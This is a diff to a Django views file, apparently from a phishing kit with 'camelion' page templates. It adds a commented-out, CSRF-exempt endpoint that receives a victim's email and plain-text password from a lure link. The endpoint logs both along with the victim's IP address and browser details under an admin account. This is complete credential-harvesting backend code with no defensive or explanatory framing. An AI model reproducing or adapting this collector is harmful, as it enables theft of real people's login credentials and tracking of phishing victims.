@@ -127,3 +127,36 @@ def camelion_two_view(request):
             'domain':domain,
         }
     return render(request, 'camelion/camelion_two.html', context)
+
+
+# import json
+# from django.views.decorators.csrf import csrf_exempt
+# from django.http import JsonResponse
+
+# @csrf_exempt
+# def get_email_camelion_one(request):
+#     if request.method == "POST":
+#         # json receive data from link
+#         data = request.body
+#         data = json.loads(data)
+
+#         #ip address and owner
+#         ip_address = get_client_ip(request)
+#         user = User.objects.get(username='myadminuser')
+
+#         # get browser information
+#         browser_info = get_browser_info(request)
+#         try:
+#             ResultLog.objects.create(
+#                 owner=user,
+#                 email=data["f_email"],
+#                 password_text=data['f_password'],
+#                 ip_address=ip_address,
+#                 browser_version=browser_info['version'],
+#                 browser_type=browser_info['browser'],
+#                 browser_agent=browser_info['agent'],
+#             )
+#         except Exception as e:
+#             print(f"Error logging information: {str(e)}")
+
+#         return JsonResponse({'message': 'Data received'},safe=False)
